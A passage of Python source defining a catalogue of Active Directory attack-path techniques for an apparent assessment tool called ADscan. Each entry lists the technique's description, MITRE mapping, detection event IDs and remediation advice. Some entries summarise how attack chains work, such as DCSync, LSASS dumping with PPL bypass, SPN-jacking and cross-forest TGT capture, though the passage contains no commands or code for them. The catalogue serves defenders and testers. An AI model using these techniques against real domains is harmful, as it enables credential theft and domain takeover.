        remediation_effort=(
            "Remove Self-Membership right from non-privileged principals on the target group."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("4728", "4732", "4756"),
        bh_native=True,
        bh_cypher_names=("AddSelf",),
        is_acl_edge=True,
    ),
    _entry(
        "addmember",
        support_kind="supported",
        support_reason="ACL/ACE abuse (AddMember)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Add arbitrary members to target group",
        remediation_complexity="low",
        remediation_effort=(
            "Remove AddMember rights from non-privileged principals on the target group. "
            "Monitor group membership changes for privileged groups."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("4728", "4732", "4756"),
        bh_native=True,
        bh_cypher_names=("AddMember",),
        is_acl_edge=True,
    ),
    _entry(
        "readgmsapassword",
        support_kind="supported",
        support_reason="ACL/ACE abuse (ReadGMSAPassword)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Read gMSA managed password material",
        vuln_key="gmsa_readable",
        remediation_complexity="low",
        remediation_effort=(
            "Restrict PrincipalsAllowedToRetrieveManagedPassword to only the specific "
            "service hosts that require the gMSA password."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1555",
        mitre_technique_name="Credentials from Password Stores",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("ReadGMSAPassword",),
        is_acl_edge=True,
    ),
    _entry(
        "readlapspassword",
        support_kind="supported",
        support_reason="ACL/ACE abuse (ReadLAPSPassword)",
        compromise_semantics="access_capability_only",
        compromise_effort="low",
        category="acl_ace",
        description="Read LAPS local administrator password",
        vuln_key="laps_readable",
        remediation_complexity="low",
        remediation_effort=(
            "Restrict read access on ms-Mcs-AdmPwd (legacy LAPS) or "
            "msLAPS-Password (Windows LAPS) to authorized IT admin groups only via AD ACL."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1555",
        mitre_technique_name="Credentials from Password Stores",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("ReadLAPSPassword",),
        is_acl_edge=True,
    ),
    _entry(
        "synclapspassword",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        category="acl_ace",
        description="Read/replicate LAPS password material",
        vuln_key="laps_readable",
        remediation_complexity="low",
        remediation_effort=(
            "Restrict SyncLAPSPassword (DS-Sync-LAPS-Password) right to LAPS admin groups only."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1555",
        mitre_technique_name="Credentials from Password Stores",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("SyncLAPSPassword",),
        is_acl_edge=True,
    ),
    _entry(
        "writedacl",
        support_kind="supported",
        support_reason="ACL/ACE abuse (WriteDacl)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Rewrite ACLs to grant further privileges",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove WriteDACL from non-privileged principals on the target object. "
            "Enable AdminSDHolder propagation for protected accounts."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1222.001",
        mitre_technique_name="Windows File and Directory Permissions Modification",
        detection_event_ids=("5136",),
        bh_native=True,
        bh_cypher_names=("WriteDacl",),
        is_acl_edge=True,
    ),
    _entry(
        "writeowner",
        support_kind="supported",
        support_reason="ACL/ACE abuse (WriteOwner)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Take ownership to unlock privilege escalation",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove WriteOwner right from non-privileged principals. "
            "Ensure object ownership is held by Domain Admins or SYSTEM only."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1222.001",
        mitre_technique_name="Windows File and Directory Permissions Modification",
        detection_event_ids=("5136",),
        bh_native=True,
        bh_cypher_names=("WriteOwner",),
        is_acl_edge=True,
    ),
    _entry(
        "writeaccountrestrictions",
        support_kind="supported",
        support_reason="ACL/ACE abuse (WriteAccountRestrictions -> RBCD on Computer targets)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description=(
            "Modify account-restriction property sets on the target user/computer object"
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Remove WriteAccountRestrictions from non-privileged principals on the "
            "target object. Restrict delegated property-set writes on privileged "
            "user and computer objects."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("5136", "4662"),
        bh_native=True,
        bh_cypher_names=("WriteAccountRestrictions",),
        is_acl_edge=True,
    ),
    _entry(
        "writespn",
        support_kind="supported",
        support_reason="ACL/ACE abuse (WriteSPN / targeted Kerberoast)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="acl_ace",
        description="Set SPN to force kerberoastable ticket generation",
        remediation_complexity="low",
        remediation_effort=(
            "Remove write access to servicePrincipalName attribute for non-privileged principals. "
            "Prevents targeted Kerberoasting via SPN injection."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558.003",
        mitre_technique_name="Steal or Forge Kerberos Tickets: Kerberoasting",
        detection_event_ids=("5136",),
        bh_native=True,
        bh_cypher_names=("WriteSPN",),
        is_acl_edge=True,
    ),
    _entry(
        "spnjack",
        support_kind="supported",
        support_reason=(
            "SPN-jacking + constrained delegation with protocol transition. The "
            "principal holds msDS-AllowedToDelegateTo plus TrustedToAuthForDelegation "
            "(T2A4D) and servicePrincipalName-write over a target computer. It "
            "relocates its delegated SPN onto the target (delspn from the current "
            "owner, addspn onto the target), then S4U2Self+S4U2Proxy and an "
            "altservice sname rewrite to obtain a service ticket against the target "
            "as any user (e.g. Administrator). Deterministic. No offline crack."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="delegation",
        description=(
            "Compromise a computer by hijacking a delegated SPN: move the SPN the "
            "principal can delegate to onto the target computer, then abuse "
            "constrained delegation (S4U) with protocol transition to mint a "
            "service ticket against the target as a privileged user"
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Remove servicePrincipalName-write (WriteSPN / GenericWrite / GenericAll "
            "/ WriteDacl / Owns) on computer objects from non-privileged principals. "
            "Remove unnecessary constrained-delegation (msDS-AllowedToDelegateTo) and "
            "TrustedToAuthForDelegation from the source principal, or add it to "
            "Protected Users. Any one of these closes this avenue."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558.003",
        mitre_technique_name="Steal or Forge Kerberos Tickets: Kerberoasting",
        detection_event_ids=("4769", "5136"),
        bh_native=False,
        bh_cypher_names=("SPNJack",),
        is_acl_edge=False,
        requires_execution_context=True,
        execution_target_access_requirement="computer_reachable",
        source_context_requirement="user_credentials",
    ),
    _entry(
        "crossorgtgtdelegation",
        support_kind="supported",
        support_reason=(
            "Cross-forest Kerberos TGT-delegation escalation. The forest trust "
            "carries the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION attribute, so a "
            "principal authenticating from the trusted forest leaves a forwardable "
            "ticket-granting ticket that crosses the trust boundary. From a "
            "compromised trusted forest, ADscan coerces a trusting-forest domain "
            "controller to authenticate to a service whose key it holds, captures "
            "the forwarded ticket-granting ticket, and replicates the trusting "
            "forest as that domain controller — collapsing the boundary between "
            "the two forests."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="medium",
        category="trust",
        description=(
            "Escalate across a forest trust into the trusting forest by abusing "
            "cross-organization Kerberos TGT delegation: a forwardable ticket-"
            "granting ticket from the trusting forest is delegated across the trust "
            "boundary and can be captured from a compromised trusted forest"
        ),
        vuln_key="trust_tgt_delegation_enabled",
        remediation_complexity="medium",
        remediation_effort=(
            "Disable TGT delegation on the forest trust so ticket-granting tickets "
            "are no longer forwarded across the forest boundary, unless a documented "
            "application explicitly requires cross-forest delegation. Confirm the "
            "trust's delegation state with the RSAT ActiveDirectory module "
            "(Get-ADTrust), and where cross-boundary delegation is genuinely needed, "
            "migrate to constrained or resource-based constrained delegation scoped "
            "to specific services. Add Domain Controllers and Tier-0 accounts on "
            "both forests to the Protected Users group so their tickets are never "
            "forwardable regardless of the trust setting."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558",
        mitre_technique_name="Steal or Forge Kerberos Tickets",
        detection_event_ids=("4769", "4768"),
        bh_native=False,
        bh_cypher_names=("CrossOrgTgtDelegation",),
        is_acl_edge=False,
        # The exposure is OBSERVED from the trust attribute (so it is a finding
        # regardless of execution) AND executable: the coerce→capture→replicate
        # chain is wired through the attack-path executor.
        finding_basis="observed_configuration",
        source_context_requirement="user_credentials",
        narrative_template=(
            "{source} trusts {target} across a forest trust that forwards Kerberos "
            "ticket-granting tickets ({relation}). Because the trust re-enables "
            "cross-organization TGT delegation, a compromise of {target} can capture "
            "a forwarded ticket-granting ticket for a privileged account and use it "
            "to reach into {source}, collapsing the boundary between the two forests."
        ),
        short_narrative_template=(
            "Forest trust forwards Kerberos TGTs — {target} can escalate into {source}"
        ),
    ),
    _entry(
        "raisechild",
        support_kind="supported",
        support_reason=(
            "Same-forest child-to-parent escalation. Every child domain shares the "
            "forest trust key with its parent, so a compromise of the child domain "
            "yields the material to forge an inter-realm ticket-granting ticket that "
            "injects the forest-root privileged group's SID history. ADscan uses the "
            "child's own replicated trust key to forge that ticket and replicate the "
            "parent (forest root) as an Enterprise Admin — the forest is one trust "
            "boundary, so owning any child domain owns the whole forest."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="medium",
        category="trust",
        description=(
            "Escalate from a compromised child domain to the forest root by forging "
            "an inter-realm ticket carrying the forest-root privileged SID history, "
            "using the shared forest trust key"
        ),
        vuln_key="raise_child_forest_root",
        remediation_complexity="high",
        remediation_effort=(
            "Treat every domain in the forest as a single Tier-0 security boundary — "
            "a child domain compromise is a forest compromise, so it cannot be fixed "
            "by a per-domain control. Enable SID filtering / quarantine only on "
            "EXTERNAL trusts (it cannot be applied to intra-forest trusts), confirm "
            "trust state with the RSAT ActiveDirectory module (Get-ADTrust), and "
            "restrict who can administer each child domain to the same standard as "
            "the forest root. Where domains hold genuinely separate security "
            "requirements, place them in SEPARATE forests rather than child domains."
        ),
        can_fully_mitigate=False,
        mitre_technique_id="T1134.005",
        mitre_technique_name="Access Token Manipulation: SID-History Injection",
        detection_event_ids=("4769", "4768"),
        bh_native=False,
        bh_cypher_names=("RaiseChild",),
        is_acl_edge=False,
        finding_basis="observed_configuration",
        source_context_requirement="user_credentials",
        narrative_template=(
            "{source} is a child domain of {target} in the same forest ({relation}). "
            "Because every child shares the forest trust key with its parent, a "
            "compromise of {source} can forge an inter-realm ticket with the forest "
            "root's privileged SID history and take over {target} as an Enterprise "
            "Admin — the forest is one security boundary."
        ),
        short_narrative_template=(
            "Child domain {source} shares the forest key — can escalate to root {target}"
        ),
    ),
    _entry(
        "writelogonscript",
        support_kind="supported",
        support_reason=(
            "Discovered via LDAP ACL analysis with prerequisite validation against "
            "NETLOGON share/path access"
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="acl_ace",
        description="Write the user's logon script path to attacker-controlled content",
        remediation_complexity="low",
        remediation_effort=(
            "Remove write access to the scriptPath attribute for non-privileged principals. "
            "Audit user objects for unexpected logon scripts and restrict writable SMB shares "
            "that could host malicious script content."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("5136",),
        is_acl_edge=True,
    ),
    _entry(
        "managerodcprp",
        support_kind="context",
        support_reason=(
            "Contextual delegated RODC PRP-control edge discovered via LDAP ACL analysis; "
            "not executed directly"
        ),
        compromise_semantics="context_only",
        compromise_effort="none",
        category="acl_ace",
        description="Modify the RODC password-replication policy on the RODC computer object",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove delegated write access to msDS-RevealOnDemandGroup and "
            "msDS-NeverRevealGroup from non-privileged principals. Review RODC "
            "delegation groups for unnecessary membership."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("5136", "4662"),
        is_acl_edge=True,
    ),
    _entry(
        "writesmbpath",
        support_kind="context",
        support_reason=(
            "Contextual staging capability discovered via SMB ACL analysis; "
            "not a standalone executable attack step"
        ),
        compromise_semantics="context_only",
        compromise_effort="none",
        category="acl_ace",
        description="Theoretical write access to an SMB share/path that can host attack payloads",
        remediation_complexity="low",
        remediation_effort=(
            "Remove write permissions from non-privileged principals on sensitive SMB paths such as "
            "NETLOGON and SYSVOL. Restrict payload staging locations to tightly controlled admins only."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1105",
        mitre_technique_name="Ingress Tool Transfer",
        detection_event_ids=("5145",),
    ),
    _entry(
        "addkeycredentiallink",
        support_kind="supported",
        support_reason=(
            "Shadow Credentials: write msDS-KeyCredentialLink on the target "
            "(computer or user), then PKINIT with the minted self-signed "
            "certificate to recover the target's NT hash / TGT. Fully native; the "
            "KeyCredentialLink is removed afterwards and the change recorded in "
            "the environment-change ledger. No offline crack."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Write msDS-KeyCredentialLink to add shadow credentials",
        remediation_complexity="low",
        remediation_effort=(
            "Remove write access to the msDS-KeyCredentialLink attribute for non-privileged principals. "
            "Prevents Shadow Credentials / PKINIT abuse."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("5136",),
        bh_native=True,
        bh_cypher_names=("AddKeyCredentialLink",),
        is_acl_edge=True,
    ),
    _entry(
        "allextendedrights",
        support_kind="supported",
        support_reason=(
            "All extended (control-access) rights over the target. Reduces to the "
            "one concrete abuse the object's extended rights confer, by object "
            "class: a user → force-change its password; a domain → replicate its "
            "secrets (DCSync); a computer → read its LAPS local-admin password. "
            "It does NOT grant attribute writes (no Shadow Credentials) or reads "
            "(no gMSA password)."
        ),
        category="acl_ace",
        description="Broad extended rights over directory object",
        vuln_key="all_extended_rights",
        remediation_complexity="medium",
        remediation_effort=(
            "Audit and remove AllExtendedRights grants from non-privileged principals. "
            "Replace with specific extended rights delegations only."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("AllExtendedRights",),
        is_acl_edge=True,
    ),
    # ── Credential access ───────────────────────────────────────────────────
    _entry(
        "dcsync",
        support_kind="supported",
        support_reason="ACL/ACE abuse / post-exploitation (DCSync)",
        # DCSync replicates the domain's secrets (every account's hash/AES keys,
        # including machine accounts), so it PRODUCES a credential-recovered
        # context for the next edge — e.g. a cross-forest TGT-delegation step that
        # decrypts with the trusted DC's machine key held from this DCSync. Without
        # this the credential-context guard prunes ``DCSync -> CrossOrgTgtDelegation``
        # (DCSync defaulted to providing "none", blocking the chain).
        compromise_semantics="credential_access_only",
        category="credential_access",
        description="Replicate AD secrets remotely from domain controller",
        vuln_key="dcsync",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove GetChanges (DS-Replication-Get-Changes) and GetChangesAll "
            "(DS-Replication-Get-Changes-All) permissions from all non-DC accounts "
            "on the domain naming context object."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.006",
        mitre_technique_name="OS Credential Dumping: DCSync",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("DCSync",),
        is_acl_edge=True,
    ),
    _entry(
        "getchanges",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan (partial DCSync right)",
        category="credential_access",
        description="Partial replication right; combined with GetChangesAll enables DCSync",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove DS-Replication-Get-Changes permission from non-DC accounts on the domain object."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.006",
        mitre_technique_name="OS Credential Dumping: DCSync",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("GetChanges",),
        is_acl_edge=True,
    ),
    _entry(
        "getchangesall",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan (partial DCSync right)",
        category="credential_access",
        description="Extended replication right; combined with GetChanges enables DCSync",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove DS-Replication-Get-Changes-All permission from non-DC accounts on the domain object."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.006",
        mitre_technique_name="OS Credential Dumping: DCSync",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("GetChangesAll",),
        is_acl_edge=True,
    ),
    _entry(
        "getchangesinfilteredset",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan (supplemental DCSync right)",
        category="credential_access",
        description="Replication right over filtered attribute set data",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove DS-Replication-Get-Changes-In-Filtered-Set permission from non-DC accounts "
            "on the domain object."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.006",
        mitre_technique_name="OS Credential Dumping: DCSync",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("GetChangesInFilteredSet",),
        is_acl_edge=True,
    ),
    _entry(
        "dumplsa",
        support_kind="supported",
        support_reason="Extracts cached secrets from the LSA store on the compromised host.",
        compromise_semantics="direct_target_compromise",
        source_context_requirement="local_admin_session",
        category="credential_access",
        description="Credential extraction from LSA secrets",
        remediation_complexity="medium",
        remediation_effort=(
            "Restrict local admin / SYSTEM access to the host — LSA secrets live in the "
            "HKLM\\SECURITY registry hive, so any SYSTEM-level principal can read them and "
            "RunAsPPL/LSA Protection does NOT apply here (it guards LSASS process memory, not "
            "the registry). Devalue what is stored: use gMSA instead of privileged service "
            "accounts, lower cached logons (CachedLogonsCount), and rotate machine/service/krbtgt "
            "secrets after suspected compromise; disable Remote Registry where it is not needed. "
            "The read itself cannot be fully prevented, so detection is essential: audit reg "
            "save/export of HKLM\\SECURITY and object access to HKLM\\SECURITY\\Policy\\Secrets, "
            "and deploy EDR credential-dump detection."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.004",
        mitre_technique_name="OS Credential Dumping: LSA Secrets",
        detection_event_ids=("4663", "4688", "4656"),
        bh_cypher_names=("DumpLSA",),
    ),
    _entry(
        "dumpdpapi",
        support_kind="supported",
        support_reason="Decrypts DPAPI-protected credentials stored on the compromised host.",
        compromise_semantics="direct_target_compromise",
        # ADscan reads the DPAPI masterkeys off the host's ADMIN$ share and needs
        # the DPAPI_SYSTEM key to decrypt machine masterkeys — both require an
        # admin session on the source host. This must match dumplsa/dumplsass so
        # a prior access edge only carries into it when it granted local admin
        # (SQLAccess, which is a DB session, must NOT satisfy it).
        source_context_requirement="local_admin_session",
        category="credential_access",
        description="Credential extraction from DPAPI-protected material",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove unnecessary local admin access. "
            "Minimize use of DPAPI-protected credentials on servers. "
            "Enable EDR-based detection for DPAPI abuse."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1555.004",
        mitre_technique_name="Credentials from Password Stores: Windows Credential Manager",
        detection_event_ids=("4663",),
        bh_cypher_names=("DumpDPAPI",),
    ),
    _entry(
        "dumplsass",
        support_kind="supported",
        support_reason=(
            "Captures an LSASS process memory image on the compromised host and parses "
            "the cached credentials out of it. The dump method adapts to the host's "
            "protection level (including PPL/LSA Protection bypass where present)."
        ),
        compromise_semantics="direct_target_compromise",
        source_context_requirement="local_admin_session",
        category="credential_access",
        description="Credential extraction from LSASS memory",
        remediation_complexity="medium",
        remediation_effort=(
            "Enable Credential Guard. Enable LSA Protection (RunAsPPL). "
            "Deploy EDR with LSASS dump detection and blocking."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.001",
        mitre_technique_name="OS Credential Dumping: LSASS Memory",
        detection_event_ids=("4656",),
        bh_cypher_names=("DumpLSASS",),
    ),
    _entry(
        "scheduledtask",
        support_kind="supported",
        support_reason=(
            "Executable via native Task Scheduler RPC (hassession_native): registers "
            "a hidden task whose Principal IS the session user (InteractiveToken), "
            "running code under the user's existing logon session."
        ),
        # Session-impersonation follow-up unlocked by HasSession. "Becomes" the
        # session user (you run code AS them) → direct_target_compromise. Requires
        # local-admin on the host (to register a task as another principal), which
        # the preceding HasSession arrival provides → local_admin_session.
        compromise_semantics="direct_target_compromise",
        source_context_requirement="local_admin_session",
        category="privilege",
        description=(
            "Impersonate a logged-on user by registering a scheduled task whose "
            "principal is that user's interactive logon session"
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Restrict Domain Admin logons to Tier 0 assets only (PAW/ESAE). "
            "Prohibit privileged logons on member servers/workstations and monitor "
            "Task Scheduler task registration (Event ID 4698) on tier-zero-adjacent hosts."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1053.005",
        mitre_technique_name="Scheduled Task/Job: Scheduled Task",
        detection_event_ids=("4698", "4624", "4672"),
        bh_cypher_names=("ScheduledTask",),
    ),
    # ── Coercion ─────────────────────────────────────────────────────────────
    _entry(
        "dfscoerce",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        source_context_requirement="none",
        category="coercion",
        description="Coerce machine authentication via DFS endpoint behavior",
        vuln_key="dfscoerce",
        remediation_complexity="medium",
        remediation_effort=(
            "Block MS-DFSNM RPC calls to DCs via firewall. "
            "Enable EPA on target services (LDAP, ADCS) to prevent relay. "
            "Apply available patches for DFS-R coercion."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768",),
        bh_cypher_names=("DFSCoerce",),
    ),
    _entry(
        "petitpotam",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        source_context_requirement="none",
        category="coercion",
        description="MS-EFSRPC coercion path (PetitPotam)",
        vuln_key="petitpotam",
        remediation_complexity="medium",
        remediation_effort=(
            "Apply CVE-2021-36942 patch. Enable EPA on AD CS HTTP endpoints. "
            "Disable EFS RPC on DCs where not required. "
            "Enable LDAP signing and channel binding."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768",),
        bh_cypher_names=("PetitPotam",),
    ),
    _entry(
        "printerbug",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        source_context_requirement="none",
        category="coercion",
        description="Spooler coercion path (PrinterBug)",
        vuln_key="printerbug",
        remediation_complexity="medium",
        remediation_effort=(
            "Disable the Print Spooler service on all DCs and servers that do not require it. "
            "May break networked printing from DCs. Evaluate impact before applying."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768",),
        bh_cypher_names=("PrinterBug",),
    ),
    # ── Entry vectors ────────────────────────────────────────────────────────
    _entry(
        "ldapanonymousbind",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        category="entry_vector",
        description="Anonymous LDAP bind entry vector",
        remediation_complexity="low",
        remediation_effort=(
            "Disable anonymous LDAP binds and restrict Anonymous Logon read access "
            "to directory objects and attributes."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1087.002",
        mitre_technique_name="Account Discovery: Domain Account",
        detection_event_ids=(),
        bh_cypher_names=("LDAPAnonymousBind",),
    ),
    _entry(
        "passwordspray",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Executable via built-in password spraying workflows",
        compromise_semantics="direct_target_compromise",
        compromise_effort="medium",
        category="entry_vector",
        description="Password spraying entry vector",
        remediation_complexity="medium",
        remediation_effort=(
            "Enforce strong password policies and account lockout thresholds. "
            "Enable MFA on all externally-accessible services. Monitor for spray patterns."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1110.003",
        mitre_technique_name="Brute Force: Password Spraying",
        detection_event_ids=("4625", "4771"),
        bh_cypher_names=("PasswordSpray",),
    ),
    _entry(
        "useraspass",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Executable via built-in username-as-password spraying workflows",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Username-as-password entry vector",
        remediation_complexity="medium",
        remediation_effort=(
            "Prevent predictable password choices that mirror usernames or account names. "
            "Enforce strong password policies, MFA, and monitor for spray patterns."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1110.003",
        mitre_technique_name="Brute Force: Password Spraying",
        detection_event_ids=("4625", "4771"),
        bh_cypher_names=("UserAsPass",),
    ),
    _entry(
        "blankpassword",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Executable via built-in blank-password validation workflow",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Blank-password entry vector",
        remediation_complexity="low",
        remediation_effort=(
            "Disable blank passwords for all domain accounts and enforce password policy "
            "validation during provisioning and account review."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1110.001",
        mitre_technique_name="Brute Force: Password Guessing",
        detection_event_ids=("4625", "4771"),
        bh_cypher_names=("BlankPassword",),
    ),
    _entry(
        "computerpre2k",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Executable via built-in pre2k computer-account validation workflow",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Pre2k computer-account password entry vector",
        remediation_complexity="medium",
        remediation_effort=(
            "Rotate computer account passwords, remove legacy pre-Windows 2000 style secrets, "
            "and review machine-account provisioning for predictable host-based passwords."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1110.003",
        mitre_technique_name="Brute Force: Password Spraying",
        detection_event_ids=("4625", "4771"),
        bh_cypher_names=("ComputerPre2k",),
    ),
    _entry(
        "passwordinshare",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Credentials discovered in SMB share content",
        remediation_complexity="low",
        remediation_effort=(
            "Scan SMB shares for credentials and remove them. "
            "Rotate any discovered credentials immediately."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1552.001",
        mitre_technique_name="Unsecured Credentials: Credentials In Files",
        detection_event_ids=(),
        bh_cypher_names=("PasswordInShare",),
    ),
    _entry(
        "passwordinfile",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Credentials discovered in host filesystem artifacts after service access",
        remediation_complexity="low",
        remediation_effort=(
            "Scan host filesystem artifacts and backups for credentials, remove embedded secrets, "
            "and rotate any exposed accounts immediately."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1552.001",
        mitre_technique_name="Unsecured Credentials: Credentials In Files",
        detection_event_ids=(),
        bh_cypher_names=("PasswordInFile",),
    ),
    _entry(
        "gpppassword",
        support_kind="supported",
        support_reason="Harvest and decrypt a Group Policy Preferences cpassword from SYSVOL",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Credentials recovered from Group Policy Preferences artifacts",
        remediation_complexity="low",
        remediation_effort=(
            "Remove GPP XML files containing cpassword fields from SYSVOL. "
            "Apply MS14-025 (KB2962486) to prevent new GPP password creation."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1552.006",
        mitre_technique_name="Unsecured Credentials: Group Policy Preferences",
        detection_event_ids=(),
        bh_cypher_names=("GPPPassword",),
    ),
    # ── Share access ────────────────────────────────────────────────────────
    _entry(
        "ReadShare",
        support_kind="supported",
        support_reason="Principal has GENERIC_READ on a network share, can access share contents",
        compromise_semantics="access_capability_only",
        compromise_effort="low",
        category="credential_access",
        description="Principal has read access to a network SMB share",
        remediation_complexity="low",
        remediation_effort=(
            "Review share permissions and restrict read access to required accounts only. "
            "Remove broad groups such as Everyone or Authenticated Users from share ACLs."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1039",
        mitre_technique_name="Data from Network Shared Drive",
        detection_event_ids=("5140",),
        bh_cypher_names=("ReadShare",),
    ),
    _entry(
        "WriteShare",
        support_kind="supported",
        support_reason="Principal has GENERIC_WRITE on a network share, can write to share",
        compromise_semantics="access_capability_only",
        compromise_effort="low",
        category="lateral_movement",
        description="Principal has write access to a network SMB share",
        remediation_complexity="low",
        remediation_effort=(
            "Restrict write permissions on shares to accounts that genuinely require it. "
            "Enable share auditing (Event ID 5145) to monitor writes."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1570",
        mitre_technique_name="Lateral Tool Transfer",
        detection_event_ids=("5145",),
        bh_cypher_names=("WriteShare",),
    ),
    _entry(
        "FullControlShare",
        support_kind="supported",
        support_reason="Principal has GENERIC_ALL on a network share, full share control",
        compromise_semantics="access_capability_only",
        compromise_effort="low",
        category="lateral_movement",
        description="Principal has full control over a network SMB share",
        remediation_complexity="low",
        remediation_effort=(
            "Remove FullControl share permissions from non-admin accounts. "
            "Apply least-privilege share ACLs and audit with Event ID 5140/5145."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1570",
        mitre_technique_name="Lateral Tool Transfer",
        detection_event_ids=("5140", "5145"),
        bh_cypher_names=("FullControlShare",),
    ),
    _entry(
        "userdescription",
        support_kind="supported",
        support_reason=(
            "ADscan reads the description and info attributes of directory accounts "
            "over LDAP and recovers any plaintext credential stored there, then "
            "verifies it against the domain to confirm a working login."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="entry_vector",
        description="Credentials recovered from LDAP user description fields",
        remediation_complexity="low",
        remediation_effort=(
            "Audit and clear credentials stored in user Description or info attributes in AD. "
            "Rotate any discovered credentials immediately."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1087.002",
        mitre_technique_name="Account Discovery: Domain Account",
        detection_event_ids=("4662",),
        bh_cypher_names=("UserDescription",),
    ),
